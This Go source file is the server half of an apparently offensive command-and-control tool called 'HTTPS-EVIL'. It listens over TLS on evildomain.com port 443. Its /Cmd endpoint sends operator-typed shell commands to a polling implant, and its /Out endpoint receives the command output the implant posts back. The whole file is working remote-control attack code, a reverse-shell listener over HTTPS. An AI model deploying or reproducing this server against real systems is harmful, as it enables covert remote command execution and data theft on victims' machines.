package main

import (
	"HTTPS-EVIL/Server/banner"
	"bufio"
	"crypto/tls"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"strings"
)

var reader = bufio.NewReader(os.Stdin)

const certPath = "cert" + string(os.PathSeparator) + "certificate.crt"
const KeyPath = "cert" + string(os.PathSeparator) + "private.key"
const host = "evildomain.com"
const puerto = 443

func Cmd(writer http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodGet {
		fmt.Println("request recibido [+]")
		fmt.Print("Command > ")
		text, _ := reader.ReadString('\n')
		text = strings.Replace(text, "\n", "", -1)
		fmt.Fprintf(writer, text)

		if text == "exit" {
			fmt.Println("exit to server ")
			//
		}
	}
}

func Out(writer http.ResponseWriter, req *http.Request) {
	if req.Method == http.MethodPost {
		body, err := ioutil.ReadAll(req.Body)
		if err != nil {
			fmt.Printf("Error : \n%s\n", err)
			return

		}
		fmt.Printf("[+] response : \n%s\n", body)
		fmt.Fprintf(writer, "data successfully [*]")
	}
}
func SetupS(host string) *http.Server {
	certData, err := ioutil.ReadFile(certPath)
	if err != nil {
		fmt.Println("error al leer el certificado")

	}
	Keydata, err := ioutil.ReadFile(KeyPath)
	if err != nil {
		fmt.Println("error al leer keyPath")
	}
	cert, err := tls.X509KeyPair(certData, Keydata)
	tlsConfig := &tls.Config{Certificates: []tls.Certificate{cert}, CipherSuites: []uint16{
		tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
		tls.TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA,
		tls.TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA,
		tls.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA,
		tls.TLS_RSA_WITH_AES_128_CBC_SHA,
		tls.TLS_RSA_WITH_AES_256_CBC_SHA,
	},
		MinVersion:               tls.VersionTLS12,
		MaxVersion:               tls.VersionTLS12,
		PreferServerCipherSuites: true}
	server := http.Server{
		Addr:      host,
		TLSConfig: tlsConfig,
	}
	return &server

}
func main() {
	fmt.Println(banner.Feed)
	hoststring := fmt.Sprintf("%s:%d", host, puerto)
	http.HandleFunc("/Cmd", Cmd)
	http.HandleFunc("/Out", Out)
	fmt.Printf("[server on %s]\n", hoststring)
	server := SetupS(hoststring)
	log.Fatal(server.ListenAndServeTLS("", ""))
}
